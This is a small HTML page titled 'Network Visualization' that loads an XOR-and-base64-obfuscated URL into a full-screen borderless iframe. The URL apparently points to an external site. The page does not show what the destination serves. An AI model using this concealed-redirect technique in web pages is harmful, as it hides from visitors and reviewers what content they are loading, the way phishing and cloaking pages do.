<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Network Visualization</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      overflow: hidden;
    }
    iframe {
      display: block;
      width: 100%;
      height: 100%;
      border: none;
    }
  </style>
</head>
<body>
  <iframe id="f" allowfullscreen></iframe>
  <script>
    var K = [73, 104, 37, 211, 56, 149, 22, 188];
    var ENC = "IRxRo0uvOZM7GwilUeY43SUPSv1b/GKSPR1I/Vzw";
    var url = atob(ENC).split("").map(function(c,i){
      return String.fromCharCode(c.charCodeAt(0) ^ K[i % K.length]);
    }).join("");
    document.getElementById("f").contentWindow.location.replace(url);
  </script>
</body>
</html>
